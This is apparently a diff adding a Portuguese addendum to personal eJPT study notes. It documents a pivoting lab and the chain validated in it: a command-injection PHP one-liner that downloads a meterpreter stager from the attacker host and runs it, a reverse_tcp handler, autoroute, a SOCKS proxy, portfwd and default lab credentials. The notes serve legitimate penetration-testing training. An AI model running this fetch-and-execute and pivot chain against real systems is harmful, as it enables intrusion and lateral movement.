@@ -672,5 +672,85 @@ Não testei pivot ponta a ponta hoje porque **não há sessão/foothold aberta**
 Treinar isso exige primeiro comprometer o `172.28.77.11` e usar ele como ponte para o `.12` —
 é o exercício recomendado para a próxima sessão de treino.
 
+---
+
+# ADENDO 12/NOV — CENÁRIO E (PIVOT) AGORA VALIDADO DE VERDADE
+
+O adendo de 23/out dizia: "não testei pivot ponta a ponta porque não há foothold".
+**Hoje testei.** Montei um lab dedicado, obtive meterpreter por RCE web e provei o tráfego
+pelo **IP de origem no alvo interno**. O que segue é o que funciona, na ordem.
+
+## O lab de pivô (novo, reprodutível)
+
+```bash
+bash ~/LIBERTUS/ejpt/pivot_up.sh          # sobe tudo
+docker logs -f pivot-internal             # log com IP de origem de cada conexão
+bash ~/LIBERTUS/ejpt/pivot_up.sh down     # derruba tudo
+```
+
+| Papel | Container | IPs | Como usar |
+|---|---|---|---|
+| Atacante | seu host | 172.20.0.1 / 172.30.0.1 | msf, proxychains, curl |
+| Host de borda (SSH) | `pivot-edge` | 172.21.0.2 (ext) · **172.20.0.2** (int) | `sshpass -p msfadmin ssh -p 2223 msfadmin@127.0.0.1` |
+| Host de borda (web) | `libertus-dvwa` | 172.30.0.2 (labnet) · **172.20.0.4** (int) | RCE via command injection → meterpreter |
+| Alvo interno | `pivot-internal` | **172.20.0.3**:8081 | `curl http://172.20.0.3:8081/` |
+
+## Cadeia validada hoje (a que você repete no exame)
+
+```bash
+# 1) foothold: RCE web no DVWA baixa e executa o stager (container não tem wget/curl)
+php -r 'file_put_contents("/tmp/m",file_get_contents("http://172.30.0.1:8899/m.elf"));'
+chmod +x /tmp/m && nohup /tmp/m >/dev/null 2>&1 &
+# handler: linux/x64/meterpreter/reverse_tcp, LHOST 172.30.0.1, LPORT 4444
+# -> [*] Meterpreter session 1 opened (172.30.0.1:4444 -> 172.30.0.2)
+
+# 2) rota (SÓ funciona com meterpreter)
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET 172.20.0.0
+set NETMASK 255.255.0.0
+run
+# -> [+] Route added to subnet 172.20.0.0/255.255.0.0 from host's routing table.
+
+# 3) proxy SOCKS
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+set VERSION 5
+run -j
+
+# 4) provar que passa pelo pivô (essencial)
+proxychains4 curl -s http://172.20.0.3:8081/
+docker logs pivot-internal | tail -3      # origem = 172.20.0.4  ✅
+```
+
+**Prova obtida hoje:** o alvo interno registrou `172.20.0.4` (IP interno do DVWA) — não
+`172.20.0.1` (atacante). Sem essa conferência, você não sabe se o pivô funciona.
+
+## As 3 armadilhas que custam tempo (todas medidas)
+
+1. **`autoroute` recusa sessão shell.** `ssh_login`/webshell = shell. Precisa de meterpreter.
+2. **`route add` em shell diz "Route added" e não roteia TCP.** Tráfego sai do atacante.
+3. **`proxychains` + nmap snap aqui = não injeta.** Use `curl`/`nc` ou scanner do msf.
+   (No Kali do exame o nmap é normal — isso é limitação só desta máquina.)
+
+## O que treinar antes de dormir (30 min, se sobrar energia)
+
+1. `bash ~/LIBERTUS/ejpt/pivot_up.sh`
+2. Repetir a cadeia acima até o `docker logs` mostrar `172.20.0.4`.
+3. Trocar o `socks_proxy` por `portfwd add -L 127.0.0.1 -l 8080 -r 172.20.0.3 -p 8081`
+   e abrir `curl http://127.0.0.1:8080`.
+4. Derrubar o lab (`... down`) para não deixar porta ocupada.
+
+## Estado dos alvos de treino (12/nov, 11:53)
+
+| Cenário | Alvo | Estado |
+|---|---|---|
+| A — SMB | 172.28.77.11 / .12 | ✅ religados, 445 aberto |
+| B — FTP | 127.0.0.1:2121 | ✅ religado, `msfadmin:msfadmin`, hydra em 1 s |
+| C — Web | localhost:8080 / 3000 | ✅ DVWA 200, Juice 200 (WebGoat 8888 fora — `docker compose up -d webgoat`) |
+| D — SSH | 127.0.0.1:2222 | ✅ religado, `msfadmin:msfadmin`, `ssh_brute.py` em 0,1 s |
+| E — Pivot | lab novo | ✅ **validado ponta a ponta hoje** |
+
 
 
